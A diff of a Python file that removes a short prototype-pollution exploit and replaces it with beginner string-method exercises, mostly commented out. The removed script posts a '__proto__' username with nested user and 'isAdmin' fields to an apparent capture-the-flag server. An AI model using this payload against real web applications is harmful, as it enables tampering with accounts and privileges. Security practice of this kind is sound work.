@@ -1,14 +1,41 @@
-import requests
-
-TARGET_URL = 'http://ctfinf.ru:10041'
-
-# make pollution
-requests.post(TARGET_URL + '/register', json = {
-    "username": "__proto__",
-    "password": "123",
-    "testuser": {
-        "username": "testuser",
-        "password": "202cb962ac59075b964b07152d234b70",
-        "isAdmin": "false"
-    }
-})
+# s = 'Hello World'
+# print(s.replace('l', '#'))
+# s = s.replace('l', '#')
+# print(s)
+# s = '123122'
+# print(s.islower())
+# print(s.isupper())
+# print(s.isdigit())
+# print(s.isalpha())
+# print(s + 'i')
+# s = s + 'i'
+# print(s)
+# Методы
+# print(s.replace('l', 'L', 2))
+#print(s.replace('ll', '@@'))
+# print(s.upper())
+# print(s.lower())
+# print(s.rindex('l'))
+# print(s.index('l'))
+# print(s.count('ll'))
+# print(s.count('l'))
+# print(len(s))
+# print(s[:2])
+# print(s[2:])
+# print(s[::-1])
+# print(s[::4])
+# print(s[0:4])
+# print(s[-3] + s[-2] + s[-1])
+# print(s[-3:])
+# print(s[-5:])
+# print(5 > 5)
+# print(5 == 6)
+# print(5 >= 5) # < <=
+# print(1 != 2)
+# print(5 != 5)
+# print('d' in 'oasdjaoiddhaodooiaqwdioqw')
+# print('d' not in 'oasdjaoiddhaodooiaqwdioqw')
+# print('o' in 'Moscow')
+s = 'hello'
+print(s.title())
+print(s.istitle())
